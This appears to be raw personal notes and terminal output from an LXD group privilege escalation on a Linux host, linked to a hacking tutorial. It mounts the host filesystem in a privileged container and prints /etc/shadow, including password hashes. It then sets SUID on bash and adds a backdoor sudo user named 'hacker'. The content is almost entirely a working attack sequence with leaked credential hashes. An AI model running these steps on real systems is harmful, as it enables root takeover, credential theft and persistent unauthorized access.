https://www.hackingarticles.in/lxd-privilege-escalation/


wget https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz -O /tmp/image.tar.gz

https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz?raw=true



win@win:~/lxd-alpine-builder$ lxd init
lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 

Do you want to configure a new storage pool? (yes/no) [default=yes]: 

Name of the new storage pool [default=default]: 

Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 

Create a new BTRFS pool? (yes/no) [default=yes]: 

Would you like to use an existing block device? (yes/no) [default=no]: 

Size in GB of the new loop device (1GB minimum) [default=15GB]: 

Would you like to connect to a MAAS server? (yes/no) [default=no]: 

Would you like to create a new local network bridge? (yes/no) [default=yes]: 

What should the new bridge be called? [default=lxdbr0]: 

What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 

What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 

Would you like LXD to be available over the network? (yes/no) [default=no]: 

Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 

Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 



lxc image import /tmp/image.tar.gz --alias alpine-v3.3




win@win:~/lxd-alpine-builder$ lxc image list
lxc image list
+-------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|    ALIAS    | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+-------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| alpine-v3.3 | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 1, 2022 at 2:37am (UTC) |
+-------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+

win@win:~/lxd-alpine-builder$ lxc init alpine-v3.3 -c security.privileged=true


win@win:~/lxd-alpine-builder$ lxc list
lxc list
+----------------+---------+------+------+------------+-----------+
|      NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+----------------+---------+------+------+------------+-----------+
| sound-marmoset | STOPPED |      |      | PERSISTENT | 0         |
+----------------+---------+------+------+------------+-----------+



win@win:~/lxd-alpine-builder$ lxc config device add sound-marmoset mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to sound-marmoset


win@win:~/lxd-alpine-builder$ lxc list
lxc list
+----------------+---------+------+------+------------+-----------+
|      NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+----------------+---------+------+------+------------+-----------+
| sound-marmoset | STOPPED |      |      | PERSISTENT | 0         |
+----------------+---------+------+------+------------+-----------+


win@win:~/lxd-alpine-builder$ lxc start sound-marmoset
lxc start sound-marmoset
win@win:~/lxd-alpine-builder$ lxc list
lxc list
+----------------+---------+------+-----------------------------------------------+------------+-----------+
|      NAME      |  STATE  | IPV4 |                     IPV6                      |    TYPE    | SNAPSHOTS |
+----------------+---------+------+-----------------------------------------------+------------+-----------+
| sound-marmoset | RUNNING |      | fd42:339b:b369:c332:216:3eff:fe35:5321 (eth0) | PERSISTENT | 0         |
+----------------+---------+------+-----------------------------------------------+------------+-----------+



win@win:~/lxd-alpine-builder$ lxc exec sound-marmoset /bin/sh


cd /mnt/root

/mnt/root # ^[[76;13Rcat etc/shadow
cat etc/shadow
root:$6$o2Zxg3h8$094TEw/9uNJDtvegCZjdeRbun1CTV42K0WuhVtL9zTkQY2zb0xHDzEZ.AxWY3fdpI86XpA6Nn1Ms1yihhxMwJ1:19051:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18315:0:99999:7:::
win:$6$9TgGpoI1$g6QIGfv//F7.9JEh/Qare5hJseod08xQmspN.579DJZz1D.bcHIWxzsFiPHC6W0iaRpgKlPFZtwBxwitsKwhm0:18418:0:99999:7:::
dominik:!:19051:0:99999:7:::
domi:$6$yYx2jcFN$v15IwmzUciGm7EuwChxTv2UEUyPXgrYoR0G8biuE2xs7TagAzL4962Y7H1PHWGOvbt7E7G3fTVuxIMmJP22eZ.:19051:0:99999:7:::



chmod u+s bin/bash

exit


/bin/bash -p
whoami

useradd -G sudo -p $(echo "password" | openssl passwd -1 -stdin) hacker

